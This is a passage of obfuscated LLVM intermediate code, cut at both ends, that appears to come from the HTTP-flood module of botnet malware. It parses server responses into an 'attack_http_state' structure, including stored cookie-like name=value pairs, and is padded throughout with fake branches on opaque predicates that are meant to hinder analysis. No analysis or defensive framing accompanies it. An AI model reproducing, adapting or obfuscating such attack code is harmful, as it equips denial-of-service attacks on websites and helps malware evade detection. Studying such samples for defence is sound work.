  br i1 %1936, label %originalBB297, label %originalBB297alteredBB

originalBB297:                                    ; preds = %originalBB297alteredBB, %1928
  %1937 = load i32, i32* %41, align 4
  %1938 = sext i32 %1937 to i64
  %1939 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1938
  store i8* %1939, i8** %43, align 8
  %1940 = load i32, i32* %42, align 4
  %1941 = icmp sge i32 %1940, 2
  %1942 = load i32, i32* @x.19
  %1943 = load i32, i32* @y.20
  %1944 = sub i32 %1942, 1
  %1945 = mul i32 %1942, %1944
  %1946 = urem i32 %1945, 2
  %1947 = icmp eq i32 %1946, 0
  %1948 = icmp slt i32 %1943, 10
  %1949 = or i1 %1947, %1948
  br i1 %1949, label %originalBBpart2299, label %originalBB297alteredBB

originalBBpart2299:                               ; preds = %originalBB297
  br i1 %1941, label %1950, label %1953

; <label>:1950:                                   ; preds = %originalBBpart2299
  %1951 = load i32, i32* %42, align 4
  %1952 = sub nsw i32 %1951, 2
  store i32 %1952, i32* %42, align 4
  br label %1953

; <label>:1953:                                   ; preds = %1950, %originalBBpart2299
  %1954 = load i32, i32* @x.19
  %1955 = load i32, i32* @y.20
  %1956 = sub i32 %1954, 1
  %1957 = mul i32 %1954, %1956
  %1958 = urem i32 %1957, 2
  %1959 = icmp eq i32 %1958, 0
  %1960 = icmp slt i32 %1955, 10
  %1961 = or i1 %1959, %1960
  br i1 %1961, label %originalBB301, label %originalBB301alteredBB

originalBB301:                                    ; preds = %originalBB301alteredBB, %1953
  %1962 = load i32, i32* %41, align 4
  %1963 = load i32, i32* %42, align 4
  %1964 = add nsw i32 %1962, %1963
  %1965 = sext i32 %1964 to i64
  %1966 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1965
  store i8 0, i8* %1966, align 1
  %1967 = load i8*, i8** %43, align 8
  %1968 = load i8*, i8** %43, align 8
  %1969 = call i32 @util_strlen(i8* %1968)
  %1970 = call i8* @table_retrieve_val(i32 67, i32* null)
  %1971 = call i32 @util_stristr(i8* %1967, i32 %1969, i8* %1970)
  %1972 = icmp ne i32 %1971, 0
  %1973 = load i32, i32* @x.19
  %1974 = load i32, i32* @y.20
  %1975 = sub i32 %1973, 1
  %1976 = mul i32 %1973, %1975
  %1977 = urem i32 %1976, 2
  %1978 = icmp eq i32 %1977, 0
  %1979 = icmp slt i32 %1974, 10
  %1980 = or i1 %1978, %1979
  br i1 %1980, label %originalBBpart2318, label %originalBB301alteredBB

originalBBpart2318:                               ; preds = %originalBB301
  br i1 %1972, label %1981, label %1984

; <label>:1981:                                   ; preds = %originalBBpart2318
  %1982 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1983 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1982, i32 0, i32 13
  store i32 1, i32* %1983, align 4
  br label %1984

; <label>:1984:                                   ; preds = %1981, %originalBBpart2318
  %1985 = load i32, i32* @x.19
  %1986 = load i32, i32* @y.20
  %1987 = sub i32 %1985, 1
  %1988 = mul i32 %1985, %1987
  %1989 = urem i32 %1988, 2
  %1990 = icmp eq i32 %1989, 0
  %1991 = icmp slt i32 %1986, 10
  %1992 = or i1 %1990, %1991
  br i1 %1992, label %originalBB320, label %originalBB320alteredBB

originalBB320:                                    ; preds = %originalBB320alteredBB, %1984
  %1993 = load i32, i32* @x.19
  %1994 = load i32, i32* @y.20
  %1995 = sub i32 %1993, 1
  %1996 = mul i32 %1993, %1995
  %1997 = urem i32 %1996, 2
  %1998 = icmp eq i32 %1997, 0
  %1999 = icmp slt i32 %1994, 10
  %2000 = or i1 %1998, %1999
  br i1 %2000, label %originalBBpart2322, label %originalBB320alteredBB

originalBBpart2322:                               ; preds = %originalBB320
  br label %2001

; <label>:2001:                                   ; preds = %originalBBpart2322, %1917
  %2002 = load i32, i32* @x.19
  %2003 = load i32, i32* @y.20
  %2004 = sub i32 %2002, 1
  %2005 = mul i32 %2002, %2004
  %2006 = urem i32 %2005, 2
  %2007 = icmp eq i32 %2006, 0
  %2008 = icmp slt i32 %2003, 10
  %2009 = or i1 %2007, %2008
  br i1 %2009, label %originalBB324, label %originalBB324alteredBB

originalBB324:                                    ; preds = %originalBB324alteredBB, %2001
  %2010 = load i32, i32* @x.19
  %2011 = load i32, i32* @y.20
  %2012 = sub i32 %2010, 1
  %2013 = mul i32 %2010, %2012
  %2014 = urem i32 %2013, 2
  %2015 = icmp eq i32 %2014, 0
  %2016 = icmp slt i32 %2011, 10
  %2017 = or i1 %2015, %2016
  br i1 %2017, label %originalBBpart2326, label %originalBB324alteredBB

originalBBpart2326:                               ; preds = %originalBB324
  br label %2018

; <label>:2018:                                   ; preds = %originalBBpart2326, %1863
  %2019 = load i32, i32* @x.19
  %2020 = load i32, i32* @y.20
  %2021 = sub i32 %2019, 1
  %2022 = mul i32 %2019, %2021
  %2023 = urem i32 %2022, 2
  %2024 = icmp eq i32 %2023, 0
  %2025 = icmp slt i32 %2020, 10
  %2026 = or i1 %2024, %2025
  br i1 %2026, label %originalBB328, label %originalBB328alteredBB

originalBB328:                                    ; preds = %originalBB328alteredBB, %2018
  %2027 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2028 = load i32, i32* %12, align 4
  %2029 = call i8* @table_retrieve_val(i32 65, i32* null)
  %2030 = call i32 @util_stristr(i8* %2027, i32 %2028, i8* %2029)
  %2031 = icmp ne i32 %2030, -1
  %2032 = load i32, i32* @x.19
  %2033 = load i32, i32* @y.20
  %2034 = sub i32 %2032, 1
  %2035 = mul i32 %2032, %2034
  %2036 = urem i32 %2035, 2
  %2037 = icmp eq i32 %2036, 0
  %2038 = icmp slt i32 %2033, 10
  %2039 = or i1 %2037, %2038
  br i1 %2039, label %originalBBpart2330, label %originalBB328alteredBB

originalBBpart2330:                               ; preds = %originalBB328
  br i1 %2031, label %2040, label %2101

; <label>:2040:                                   ; preds = %originalBBpart2330
  %2041 = load i32, i32* @x.19
  %2042 = load i32, i32* @y.20
  %2043 = sub i32 %2041, 1
  %2044 = mul i32 %2041, %2043
  %2045 = urem i32 %2044, 2
  %2046 = icmp eq i32 %2045, 0
  %2047 = icmp slt i32 %2042, 10
  %2048 = or i1 %2046, %2047
  br i1 %2048, label %originalBB332, label %originalBB332alteredBB

originalBB332:                                    ; preds = %originalBB332alteredBB, %2040
  %2049 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2050 = load i32, i32* %12, align 4
  %2051 = call i8* @table_retrieve_val(i32 65, i32* null)
  %2052 = call i32 @util_stristr(i8* %2049, i32 %2050, i8* %2051)
  store i32 %2052, i32* %44, align 4
  %2053 = load i32, i32* %44, align 4
  %2054 = sext i32 %2053 to i64
  %2055 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2054
  %2056 = load i8, i8* %2055, align 1
  %2057 = sext i8 %2056 to i32
  %2058 = icmp eq i32 %2057, 32
  %2059 = load i32, i32* @x.19
  %2060 = load i32, i32* @y.20
  %2061 = sub i32 %2059, 1
  %2062 = mul i32 %2059, %2061
  %2063 = urem i32 %2062, 2
  %2064 = icmp eq i32 %2063, 0
  %2065 = icmp slt i32 %2060, 10
  %2066 = or i1 %2064, %2065
  br i1 %2066, label %originalBBpart2334, label %originalBB332alteredBB

originalBBpart2334:                               ; preds = %originalBB332
  br i1 %2058, label %2067, label %2070

; <label>:2067:                                   ; preds = %originalBBpart2334
  %2068 = load i32, i32* %44, align 4
  %2069 = add nsw i32 %2068, 1
  store i32 %2069, i32* %44, align 4
  br label %2070

; <label>:2070:                                   ; preds = %2067, %originalBBpart2334
  %2071 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2072 = load i32, i32* %44, align 4
  %2073 = sext i32 %2072 to i64
  %2074 = getelementptr inbounds i8, i8* %2071, i64 %2073
  %2075 = load i32, i32* %12, align 4
  %2076 = load i32, i32* %44, align 4
  %2077 = sub nsw i32 %2075, %2076
  %2078 = call i32 @util_memsearch(i8* %2074, i32 %2077, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2078, i32* %45, align 4
  %2079 = load i32, i32* %45, align 4
  %2080 = icmp ne i32 %2079, -1
  br i1 %2080, label %2081, label %2100

; <label>:2081:                                   ; preds = %2070
  %2082 = load i32, i32* %44, align 4
  %2083 = sext i32 %2082 to i64
  %2084 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2083
  store i8* %2084, i8** %46, align 8
  %2085 = load i32, i32* %45, align 4
  %2086 = icmp sge i32 %2085, 2
  br i1 %2086, label %2087, label %2090

; <label>:2087:                                   ; preds = %2081
  %2088 = load i32, i32* %45, align 4
  %2089 = sub nsw i32 %2088, 2
  store i32 %2089, i32* %45, align 4
  br label %2090

; <label>:2090:                                   ; preds = %2087, %2081
  %2091 = load i32, i32* %44, align 4
  %2092 = load i32, i32* %45, align 4
  %2093 = add nsw i32 %2091, %2092
  %2094 = sext i32 %2093 to i64
  %2095 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2094
  store i8 0, i8* %2095, align 1
  %2096 = load i8*, i8** %46, align 8
  %2097 = call i32 @util_atoi(i8* %2096, i32 10)
  %2098 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2099 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2098, i32 0, i32 14
  store i32 %2097, i32* %2099, align 4
  br label %2100

; <label>:2100:                                   ; preds = %2090, %2070
  br label %2104

; <label>:2101:                                   ; preds = %originalBBpart2330
  %2102 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2103 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2102, i32 0, i32 14
  store i32 0, i32* %2103, align 4
  br label %2104

; <label>:2104:                                   ; preds = %2101, %2100
  store i32 0, i32* %37, align 4
  br label %2105

; <label>:2105:                                   ; preds = %2424, %2104
  %2106 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2107 = load i32, i32* %37, align 4
  %2108 = sext i32 %2107 to i64
  %2109 = getelementptr inbounds i8, i8* %2106, i64 %2108
  %2110 = load i32, i32* %12, align 4
  %2111 = call i8* @table_retrieve_val(i32 64, i32* null)
  %2112 = call i32 @util_stristr(i8* %2109, i32 %2110, i8* %2111)
  %2113 = icmp ne i32 %2112, -1
  br i1 %2113, label %2114, label %2119

; <label>:2114:                                   ; preds = %2105
  %2115 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2116 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2115, i32 0, i32 15
  %2117 = load i32, i32* %2116, align 4
  %2118 = icmp slt i32 %2117, 5
  br label %2119

; <label>:2119:                                   ; preds = %2114, %2105
  %2120 = phi i1 [ false, %2105 ], [ %2118, %2114 ]
  br i1 %2120, label %2121, label %2428

; <label>:2121:                                   ; preds = %2119
  %2122 = load i32, i32* @x.19
  %2123 = load i32, i32* @y.20
  %2124 = sub i32 %2122, 1
  %2125 = mul i32 %2122, %2124
  %2126 = urem i32 %2125, 2
  %2127 = icmp eq i32 %2126, 0
  %2128 = icmp slt i32 %2123, 10
  %2129 = or i1 %2127, %2128
  br i1 %2129, label %originalBB336, label %originalBB336alteredBB

originalBB336:                                    ; preds = %originalBB336alteredBB, %2121
  %2130 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2131 = load i32, i32* %37, align 4
  %2132 = sext i32 %2131 to i64
  %2133 = getelementptr inbounds i8, i8* %2130, i64 %2132
  %2134 = load i32, i32* %12, align 4
  %2135 = call i8* @table_retrieve_val(i32 64, i32* null)
  %2136 = call i32 @util_stristr(i8* %2133, i32 %2134, i8* %2135)
  store i32 %2136, i32* %47, align 4
  %2137 = load i32, i32* %37, align 4
  %2138 = load i32, i32* %47, align 4
  %2139 = add nsw i32 %2137, %2138
  %2140 = sext i32 %2139 to i64
  %2141 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2140
  %2142 = load i8, i8* %2141, align 1
  %2143 = sext i8 %2142 to i32
  %2144 = icmp eq i32 %2143, 32
  %2145 = load i32, i32* @x.19
  %2146 = load i32, i32* @y.20
  %2147 = sub i32 %2145, 1
  %2148 = mul i32 %2145, %2147
  %2149 = urem i32 %2148, 2
  %2150 = icmp eq i32 %2149, 0
  %2151 = icmp slt i32 %2146, 10
  %2152 = or i1 %2150, %2151
  br i1 %2152, label %originalBBpart2344, label %originalBB336alteredBB

originalBBpart2344:                               ; preds = %originalBB336
  br i1 %2144, label %2153, label %2172

; <label>:2153:                                   ; preds = %originalBBpart2344
  %2154 = load i32, i32* @x.19
  %2155 = load i32, i32* @y.20
  %2156 = sub i32 %2154, 1
  %2157 = mul i32 %2154, %2156
  %2158 = urem i32 %2157, 2
  %2159 = icmp eq i32 %2158, 0
  %2160 = icmp slt i32 %2155, 10
  %2161 = or i1 %2159, %2160
  br i1 %2161, label %originalBB346, label %originalBB346alteredBB

originalBB346:                                    ; preds = %originalBB346alteredBB, %2153
  %2162 = load i32, i32* %47, align 4
  %2163 = add nsw i32 %2162, 1
  store i32 %2163, i32* %47, align 4
  %2164 = load i32, i32* @x.19
  %2165 = load i32, i32* @y.20
  %2166 = sub i32 %2164, 1
  %2167 = mul i32 %2164, %2166
  %2168 = urem i32 %2167, 2
  %2169 = icmp eq i32 %2168, 0
  %2170 = icmp slt i32 %2165, 10
  %2171 = or i1 %2169, %2170
  br i1 %2171, label %originalBBpart2351, label %originalBB346alteredBB

originalBBpart2351:                               ; preds = %originalBB346
  br label %2172

; <label>:2172:                                   ; preds = %originalBBpart2351, %originalBBpart2344
  %2173 = load i32, i32* @x.19
  %2174 = load i32, i32* @y.20
  %2175 = sub i32 %2173, 1
  %2176 = mul i32 %2173, %2175
  %2177 = urem i32 %2176, 2
  %2178 = icmp eq i32 %2177, 0
  %2179 = icmp slt i32 %2174, 10
  %2180 = or i1 %2178, %2179
  br i1 %2180, label %originalBB353, label %originalBB353alteredBB

originalBB353:                                    ; preds = %originalBB353alteredBB, %2172
  %2181 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2182 = load i32, i32* %37, align 4
  %2183 = sext i32 %2182 to i64
  %2184 = getelementptr inbounds i8, i8* %2181, i64 %2183
  %2185 = load i32, i32* %47, align 4
  %2186 = sext i32 %2185 to i64
  %2187 = getelementptr inbounds i8, i8* %2184, i64 %2186
  %2188 = load i32, i32* %12, align 4
  %2189 = load i32, i32* %37, align 4
  %2190 = sub nsw i32 %2188, %2189
  %2191 = load i32, i32* %47, align 4
  %2192 = sub nsw i32 %2190, %2191
  %2193 = call i32 @util_memsearch(i8* %2187, i32 %2192, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2193, i32* %48, align 4
  %2194 = load i32, i32* %48, align 4
  %2195 = icmp ne i32 %2194, -1
  %2196 = load i32, i32* @x.19
  %2197 = load i32, i32* @y.20
  %2198 = sub i32 %2196, 1
  %2199 = mul i32 %2196, %2198
  %2200 = urem i32 %2199, 2
  %2201 = icmp eq i32 %2200, 0
  %2202 = icmp slt i32 %2197, 10
  %2203 = or i1 %2201, %2202
  br i1 %2203, label %originalBBpart2371, label %originalBB353alteredBB

originalBBpart2371:                               ; preds = %originalBB353
  br i1 %2195, label %2204, label %2424

; <label>:2204:                                   ; preds = %originalBBpart2371
  %2205 = load i32, i32* %37, align 4
  %2206 = load i32, i32* %47, align 4
  %2207 = add nsw i32 %2205, %2206
  %2208 = sext i32 %2207 to i64
  %2209 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2208
  store i8* %2209, i8** %49, align 8
  %2210 = load i32, i32* %48, align 4
  %2211 = icmp sge i32 %2210, 2
  br i1 %2211, label %2212, label %2215

; <label>:2212:                                   ; preds = %2204
  %2213 = load i32, i32* %48, align 4
  %2214 = sub nsw i32 %2213, 2
  store i32 %2214, i32* %48, align 4
  br label %2215

; <label>:2215:                                   ; preds = %2212, %2204
  %2216 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2217 = load i32, i32* %37, align 4
  %2218 = sext i32 %2217 to i64
  %2219 = getelementptr inbounds i8, i8* %2216, i64 %2218
  %2220 = load i32, i32* %47, align 4
  %2221 = sext i32 %2220 to i64
  %2222 = getelementptr inbounds i8, i8* %2219, i64 %2221
  %2223 = load i32, i32* %12, align 4
  %2224 = load i32, i32* %37, align 4
  %2225 = sub nsw i32 %2223, %2224
  %2226 = load i32, i32* %47, align 4
  %2227 = sub nsw i32 %2225, %2226
  %2228 = call i32 @util_memsearch(i8* %2222, i32 %2227, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2229 = icmp sgt i32 %2228, 0
  br i1 %2229, label %2230, label %2261

; <label>:2230:                                   ; preds = %2215
  %2231 = load i32, i32* @x.19
  %2232 = load i32, i32* @y.20
  %2233 = sub i32 %2231, 1
  %2234 = mul i32 %2231, %2233
  %2235 = urem i32 %2234, 2
  %2236 = icmp eq i32 %2235, 0
  %2237 = icmp slt i32 %2232, 10
  %2238 = or i1 %2236, %2237
  br i1 %2238, label %originalBB373, label %originalBB373alteredBB

originalBB373:                                    ; preds = %originalBB373alteredBB, %2230
  %2239 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2240 = load i32, i32* %37, align 4
  %2241 = sext i32 %2240 to i64
  %2242 = getelementptr inbounds i8, i8* %2239, i64 %2241
  %2243 = load i32, i32* %47, align 4
  %2244 = sext i32 %2243 to i64
  %2245 = getelementptr inbounds i8, i8* %2242, i64 %2244
  %2246 = load i32, i32* %12, align 4
  %2247 = load i32, i32* %37, align 4
  %2248 = sub nsw i32 %2246, %2247
  %2249 = load i32, i32* %47, align 4
  %2250 = sub nsw i32 %2248, %2249
  %2251 = call i32 @util_memsearch(i8* %2245, i32 %2250, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2252 = sub nsw i32 %2251, 1
  store i32 %2252, i32* %48, align 4
  %2253 = load i32, i32* @x.19
  %2254 = load i32, i32* @y.20
  %2255 = sub i32 %2253, 1
  %2256 = mul i32 %2253, %2255
  %2257 = urem i32 %2256, 2
  %2258 = icmp eq i32 %2257, 0
  %2259 = icmp slt i32 %2254, 10
  %2260 = or i1 %2258, %2259
  br i1 %2260, label %originalBBpart2389, label %originalBB373alteredBB

originalBBpart2389:                               ; preds = %originalBB373
  br label %2261

; <label>:2261:                                   ; preds = %originalBBpart2389, %2215
  %2262 = load i32, i32* @x.19
  %2263 = load i32, i32* @y.20
  %2264 = sub i32 %2262, 1
  %2265 = mul i32 %2262, %2264
  %2266 = urem i32 %2265, 2
  %2267 = icmp eq i32 %2266, 0
  %2268 = icmp slt i32 %2263, 10
  %2269 = or i1 %2267, %2268
  br i1 %2269, label %originalBB391, label %originalBB391alteredBB

originalBB391:                                    ; preds = %originalBB391alteredBB, %2261
  %2270 = load i32, i32* %37, align 4
  %2271 = load i32, i32* %47, align 4
  %2272 = add nsw i32 %2270, %2271
  %2273 = load i32, i32* %48, align 4
  %2274 = add nsw i32 %2272, %2273
  %2275 = sext i32 %2274 to i64
  %2276 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2275
  store i8 0, i8* %2276, align 1
  store i32 0, i32* %10, align 4
  %2277 = load i32, i32* @x.19
  %2278 = load i32, i32* @y.20
  %2279 = sub i32 %2277, 1
  %2280 = mul i32 %2277, %2279
  %2281 = urem i32 %2280, 2
  %2282 = icmp eq i32 %2281, 0
  %2283 = icmp slt i32 %2278, 10
  %2284 = or i1 %2282, %2283
  br i1 %2284, label %originalBBpart2406, label %originalBB391alteredBB

originalBBpart2406:                               ; preds = %originalBB391
  br label %2285

; <label>:2285:                                   ; preds = %2316, %originalBBpart2406
  %2286 = load i32, i32* %10, align 4
  %2287 = load i8*, i8** %49, align 8
  %2288 = call i32 @util_strlen(i8* %2287)
  %2289 = icmp slt i32 %2286, %2288
  br i1 %2289, label %2290, label %2319

; <label>:2290:                                   ; preds = %2285
  %2291 = load i8*, i8** %49, align 8
  %2292 = load i32, i32* %10, align 4
  %2293 = sext i32 %2292 to i64
  %2294 = getelementptr inbounds i8, i8* %2291, i64 %2293
  %2295 = load i8, i8* %2294, align 1
  %2296 = sext i8 %2295 to i32
  %2297 = icmp eq i32 %2296, 61
  br i1 %2297, label %2298, label %2299

; <label>:2298:                                   ; preds = %2290
  br label %2319

; <label>:2299:                                   ; preds = %2290
  %2300 = load i32, i32* @x.19
  %2301 = load i32, i32* @y.20
  %2302 = sub i32 %2300, 1
  %2303 = mul i32 %2300, %2302
  %2304 = urem i32 %2303, 2
  %2305 = icmp eq i32 %2304, 0
  %2306 = icmp slt i32 %2301, 10
  %2307 = or i1 %2305, %2306
  br i1 %2307, label %originalBB408, label %originalBB408alteredBB

originalBB408:                                    ; preds = %originalBB408alteredBB, %2299
  %2308 = load i32, i32* @x.19
  %2309 = load i32, i32* @y.20
  %2310 = sub i32 %2308, 1
  %2311 = mul i32 %2308, %2310
  %2312 = urem i32 %2311, 2
  %2313 = icmp eq i32 %2312, 0
  %2314 = icmp slt i32 %2309, 10
  %2315 = or i1 %2313, %2314
  br i1 %2315, label %originalBBpart2410, label %originalBB408alteredBB

originalBBpart2410:                               ; preds = %originalBB408
  br label %2316

; <label>:2316:                                   ; preds = %originalBBpart2410
  %2317 = load i32, i32* %10, align 4
  %2318 = add nsw i32 %2317, 1
  store i32 %2318, i32* %10, align 4
  br label %2285

; <label>:2319:                                   ; preds = %2298, %2285
  %2320 = load i8*, i8** %49, align 8
  %2321 = load i32, i32* %10, align 4
  %2322 = sext i32 %2321 to i64
  %2323 = getelementptr inbounds i8, i8* %2320, i64 %2322
  %2324 = load i8, i8* %2323, align 1
  %2325 = sext i8 %2324 to i32
  %2326 = icmp eq i32 %2325, 61
  br i1 %2326, label %2327, label %2407

; <label>:2327:                                   ; preds = %2319
  %2328 = load i32, i32* %10, align 4
  store i32 %2328, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  br label %2329

; <label>:2329:                                   ; preds = %2364, %2327
  %2330 = load i32, i32* %10, align 4
  %2331 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2331, i32 0, i32 15
  %2333 = load i32, i32* %2332, align 4
  %2334 = icmp slt i32 %2330, %2333
  br i1 %2334, label %2335, label %2367

; <label>:2335:                                   ; preds = %2329
  %2336 = load i32, i32* @x.19
  %2337 = load i32, i32* @y.20
  %2338 = sub i32 %2336, 1
  %2339 = mul i32 %2336, %2338
  %2340 = urem i32 %2339, 2
  %2341 = icmp eq i32 %2340, 0
  %2342 = icmp slt i32 %2337, 10
  %2343 = or i1 %2341, %2342
  br i1 %2343, label %originalBB412, label %originalBB412alteredBB

originalBB412:                                    ; preds = %originalBB412alteredBB, %2335
  %2344 = load i8*, i8** %49, align 8
  %2345 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2346 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2345, i32 0, i32 16
  %2347 = load i32, i32* %10, align 4
  %2348 = sext i32 %2347 to i64
  %2349 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2346, i64 0, i64 %2348
  %2350 = getelementptr inbounds [128 x i8], [128 x i8]* %2349, i32 0, i32 0
  %2351 = load i32, i32* %50, align 4
  %2352 = call signext i8 @util_strncmp(i8* %2344, i8* %2350, i32 %2351)
  %2353 = icmp ne i8 %2352, 0
  %2354 = load i32, i32* @x.19
  %2355 = load i32, i32* @y.20
  %2356 = sub i32 %2354, 1
  %2357 = mul i32 %2354, %2356
  %2358 = urem i32 %2357, 2
  %2359 = icmp eq i32 %2358, 0
  %2360 = icmp slt i32 %2355, 10
  %2361 = or i1 %2359, %2360
  br i1 %2361, label %originalBBpart2414, label %originalBB412alteredBB

originalBBpart2414:                               ; preds = %originalBB412
  br i1 %2353, label %2362, label %2363

; <label>:2362:                                   ; preds = %originalBBpart2414
  store i32 1, i32* %51, align 4
  br label %2367

; <label>:2363:                                   ; preds = %originalBBpart2414
  br label %2364

; <label>:2364:                                   ; preds = %2363
  %2365 = load i32, i32* %10, align 4
  %2366 = add nsw i32 %2365, 1
  store i32 %2366, i32* %10, align 4
  br label %2329

; <label>:2367:                                   ; preds = %2362, %2329
  %2368 = load i32, i32* %51, align 4
  %2369 = icmp ne i32 %2368, 0
  br i1 %2369, label %2406, label %2370

; <label>:2370:                                   ; preds = %2367
  %2371 = load i8*, i8** %49, align 8
  %2372 = call i32 @util_strlen(i8* %2371)
  %2373 = icmp slt i32 %2372, 128
  br i1 %2373, label %2374, label %2389

; <label>:2374:                                   ; preds = %2370
  %2375 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2376 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2375, i32 0, i32 16
  %2377 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2378 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2377, i32 0, i32 15
  %2379 = load i32, i32* %2378, align 4
  %2380 = sext i32 %2379 to i64
  %2381 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2376, i64 0, i64 %2380
  %2382 = getelementptr inbounds [128 x i8], [128 x i8]* %2381, i32 0, i32 0
  %2383 = load i8*, i8** %49, align 8
  %2384 = call i32 @util_strcpy(i8* %2382, i8* %2383)
  %2385 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2386 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2385, i32 0, i32 15
  %2387 = load i32, i32* %2386, align 4
  %2388 = add nsw i32 %2387, 1
  store i32 %2388, i32* %2386, align 4
  br label %2389

; <label>:2389:                                   ; preds = %2374, %2370
  %2390 = load i32, i32* @x.19
  %2391 = load i32, i32* @y.20
  %2392 = sub i32 %2390, 1
  %2393 = mul i32 %2390, %2392
  %2394 = urem i32 %2393, 2
  %2395 = icmp eq i32 %2394, 0
  %2396 = icmp slt i32 %2391, 10
  %2397 = or i1 %2395, %2396
  br i1 %2397, label %originalBB416, label %originalBB416alteredBB

originalBB416:                                    ; preds = %originalBB416alteredBB, %2389
  %2398 = load i32, i32* @x.19
  %2399 = load i32, i32* @y.20
  %2400 = sub i32 %2398, 1
  %2401 = mul i32 %2398, %2400
  %2402 = urem i32 %2401, 2
  %2403 = icmp eq i32 %2402, 0
  %2404 = icmp slt i32 %2399, 10
  %2405 = or i1 %2403, %2404
  br i1 %2405, label %originalBBpart2418, label %originalBB416alteredBB

originalBBpart2418:                               ; preds = %originalBB416
  br label %2406

; <label>:2406:                                   ; preds = %originalBBpart2418, %2367
  br label %2407

; <label>:2407:                                   ; preds = %2406, %2319
  %2408 = load i32, i32* @x.19
  %2409 = load i32, i32* @y.20
  %2410 = sub i32 %2408, 1
  %2411 = mul i32 %2408, %2410
  %2412 = urem i32 %2411, 2
  %2413 = icmp eq i32 %2412, 0
  %2414 = icmp slt i32 %2409, 10
  %2415 = or i1 %2413, %2414
  br i1 %2415, label %originalBB420, label %originalBB420alteredBB

originalBB420:                                    ; preds = %originalBB420alteredBB, %2407
  %2416 = load i32, i32* @x.19
  %2417 = load i32, i32* @y.20
  %2418 = sub i32 %2416, 1
  %2419 = mul i32 %2416, %2418
  %2420 = urem i32 %2419, 2
  %2421 = icmp eq i32 %2420, 0
  %2422 = icmp slt i32 %2417, 10
  %2423 = or i1 %2421, %2422
  br i1 %2423, label %originalBBpart2422, label %originalBB420alteredBB

originalBBpart2422:                               ; preds = %originalBB420
  br label %2424

; <label>:2424:                                   ; preds = %originalBBpart2422, %originalBBpart2371
  %2425 = load i32, i32* %47, align 4
  %2426 = load i32, i32* %37, align 4
  %2427 = add nsw i32 %2426, %2425
  store i32 %2427, i32* %37, align 4
  br label %2105

; <label>:2428:                                   ; preds = %2119
  %2429 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2430 = load i32, i32* %12, align 4
  %2431 = call i8* @table_retrieve_val(i32 63, i32* null)
  %2432 = call i32 @util_stristr(i8* %2429, i32 %2430, i8* %2431)
  %2433 = icmp ne i32 %2432, -1
  br i1 %2433, label %2434, label %2725

; <label>:2434:                                   ; preds = %2428
  %2435 = load i32, i32* @x.19
  %2436 = load i32, i32* @y.20
  %2437 = sub i32 %2435, 1
  %2438 = mul i32 %2435, %2437
  %2439 = urem i32 %2438, 2
  %2440 = icmp eq i32 %2439, 0
  %2441 = icmp slt i32 %2436, 10
  %2442 = or i1 %2440, %2441
  br i1 %2442, label %originalBB424, label %originalBB424alteredBB

originalBB424:                                    ; preds = %originalBB424alteredBB, %2434
  %2443 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2444 = load i32, i32* %12, align 4
  %2445 = call i8* @table_retrieve_val(i32 63, i32* null)
  %2446 = call i32 @util_stristr(i8* %2443, i32 %2444, i8* %2445)
  store i32 %2446, i32* %52, align 4
  %2447 = load i32, i32* %52, align 4
  %2448 = sext i32 %2447 to i64
  %2449 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2448
  %2450 = load i8, i8* %2449, align 1
  %2451 = sext i8 %2450 to i32
  %2452 = icmp eq i32 %2451, 32
  %2453 = load i32, i32* @x.19
  %2454 = load i32, i32* @y.20
  %2455 = sub i32 %2453, 1
